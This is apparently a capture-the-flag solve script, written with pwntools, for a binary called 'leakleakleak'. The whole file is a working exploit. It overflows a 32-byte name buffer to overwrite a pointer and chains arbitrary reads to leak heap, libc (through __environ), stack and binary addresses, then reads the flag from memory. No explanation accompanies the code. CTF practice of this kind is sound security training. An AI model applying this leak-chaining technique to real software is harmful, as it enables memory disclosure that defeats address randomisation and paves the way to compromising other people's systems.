#!/usr/bin/env python3

from pwn import *

exe = ELF("./leakleakleak_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['alacritty', '-e']


def conn():
    if args.REMOTE:
        io = remote("0.0.0.0", 5000)
    else:
        if args.GDB:
            io = gdb.debug([exe.path])
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()

    io.sendline(b'A' * 32)
    io.recvuntil(b'Hello ')
    io.recvuntil(b'\n')
    heap_leak = (b'\x00' + io.recvuntil(b'!\n')[:-2]).ljust(8, b'\x00')
    heap_leak = u64(heap_leak)
    info(f'heap leak: {hex(heap_leak)}')

    libc_addr = heap_leak + 0x110
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(libc_addr))
    io.recvuntil(b':3\n')
    libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
    info(f'libc leak: {hex(libc_leak)}')

    libc.address = libc_leak - 2208601

    stack_addr = libc.symbols['__environ']
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(stack_addr))
    io.recvuntil(b':3\n')
    stack_leak = u64(io.recv(6).ljust(8, b'\x00'))
    info(f'stack leak: {hex(stack_leak)}')

    bin_addr = stack_leak - 0x150
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(bin_addr))
    io.recvuntil(b':3\n')
    bin_leak = u64(io.recv(6).ljust(8, b'\x00'))
    info(f'bin leak: {hex(bin_leak)}')

    flag_addr = bin_leak + 0x2d1e + 36
    info(f'flag addr: {hex(flag_addr)}')
    io.sendafter(b'Continue?', b'Y')
    io.sendafter(b'name', b'A' * 32 + p64(flag_addr))
    io.recvuntil(b':3\n')

    io.interactive()


if __name__ == "__main__":
    main()
